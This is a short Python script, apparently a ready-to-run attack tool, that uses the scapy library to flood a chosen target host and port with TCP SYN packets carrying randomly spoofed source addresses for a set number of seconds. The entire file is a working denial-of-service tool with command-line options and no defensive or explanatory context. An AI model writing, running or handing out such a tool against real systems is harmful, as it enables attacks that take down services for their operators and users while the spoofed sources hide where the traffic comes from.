#!/usr/bin/env python3

import sys
import time
import random
import argparse
from scapy.all import IP, TCP, send, conf

conf.verb = 0

def syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    count = 0
    
    while time.time() < end_time:
        src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 999999))
        
        send(ip/tcp, verbose=False)
        count += 1
        
        if count % 10000 == 0:
            sys.stderr.write(f"\r[SYN] Sent: {count}")
    
    sys.stderr.write(f"\n[SYN] Completed: {count} packets\n")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--duration", type=int, default=60)
    args = parser.parse_args()
    
    syn_flood(args.target, args.port, args.duration)
